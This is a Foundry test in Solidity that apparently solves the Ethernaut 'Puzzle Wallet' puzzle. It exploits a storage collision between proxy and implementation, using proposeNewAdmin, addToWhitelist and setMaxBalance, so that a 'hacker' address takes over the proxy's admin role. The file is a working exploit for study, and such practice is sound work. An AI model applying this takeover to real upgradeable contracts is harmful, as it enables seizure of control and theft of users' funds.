// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import { PuzzleProxy, PuzzleWallet } from "../src/PuzzleWallet.sol";

contract PuzzleWalletTest is Test {
    PuzzleWallet public puzzleWallet;
    PuzzleProxy public puzzleProxy;

    address hacker;

    function setUp() public {
        puzzleWallet = new PuzzleWallet();
        puzzleProxy = new PuzzleProxy(tx.origin, address(puzzleWallet), abi.encodeWithSignature("init(uint256)", 10));

        hacker = makeAddr("hacker");
    }

    function testPuzzleWallet() public {
        assertFalse(puzzleProxy.admin() == hacker);    

        vm.startPrank(hacker, hacker);

        // Make PuzzleWallet.owner() == hacker, in memory storage of PuzzleProxy
        puzzleProxy.proposeNewAdmin(address(hacker));

        // Whitelist hacker using PuzzleWallet.addToWhitelist(), in memory storage of PuzzleProxy
        address(puzzleProxy).call(abi.encodeWithSignature("addToWhitelist(address)", address(hacker)));

        // Change maxBalance inside PuzzleWallet, effectively changing admin in PuzzleProxy
        address(puzzleProxy).call(abi.encodeWithSignature("setMaxBalance(uint256)", uint256(uint160(address(hacker)))));

        vm.stopPrank();

        assertTrue(puzzleProxy.admin() == hacker);
    }
}
